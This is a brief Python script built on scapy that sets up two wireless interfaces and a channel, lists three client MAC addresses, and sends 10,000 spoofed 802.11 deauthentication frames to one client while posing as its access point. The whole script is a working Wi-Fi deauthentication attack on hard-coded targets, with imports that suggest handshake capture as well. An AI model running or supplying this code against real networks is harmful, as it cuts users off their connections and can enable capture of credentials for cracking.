from scapy.all import Dot11, sniff, RadioTap, Dot11Beacon, Dot11Elt, EAPOL, Dot11Deauth, sendp
from scapy.layers.dot11 import *

sniffinterface = "wlx5c628b4b90ba"
deauthinterface = "wlx5c628b4ba281"
channel = 124

client_macs = ["4c:4f:ee:d6:ca:87","5a:b0:e3:e8:70:2f","28:c2:1f:6a:a1:77"]



sendp(RadioTap()/Dot11(addr1="4c:4f:ee:d6:ca:87", addr2="80:8d:b7:0b:cd:91", addr3="80:8d:b7:0b:cd:91")/Dot11Deauth(reason=0), iface=deauthinterface, inter=0.01, count=10000)


